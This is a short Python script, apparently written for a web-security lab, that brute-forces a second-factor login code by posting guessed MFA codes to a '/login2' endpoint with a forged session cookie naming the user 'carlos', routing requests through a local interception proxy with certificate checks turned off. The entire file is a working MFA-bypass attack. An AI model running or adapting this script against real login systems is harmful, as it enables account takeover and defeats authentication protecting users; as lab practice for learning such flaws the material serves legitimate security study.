import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

cookies = {
    'session': '123',
    'verify': 'carlos'
}


def brute_force_mfa(url):
    for i in range(10):
        mfa_code = f"9{i:03d}"
        payload = f"mfa-code={mfa_code}"
        r = requests.post(url + '/login2', data=payload, cookies=cookies,
                          verify=False, proxies=proxies)
        if r.status_code == 302:
            print(f"[+] Code found: {mfa_code}")
            break
        else:
            print(r.text)
            print(f"[-] Tried code: {mfa_code}")


def main():
    if len(sys.argv) != 2:
        print('add url: example.com')
        sys.exit(-1)

    url = sys.argv[1]
    print('cracking mfa...')
    brute_force_mfa(url)


if __name__ == '__main__':
    main()
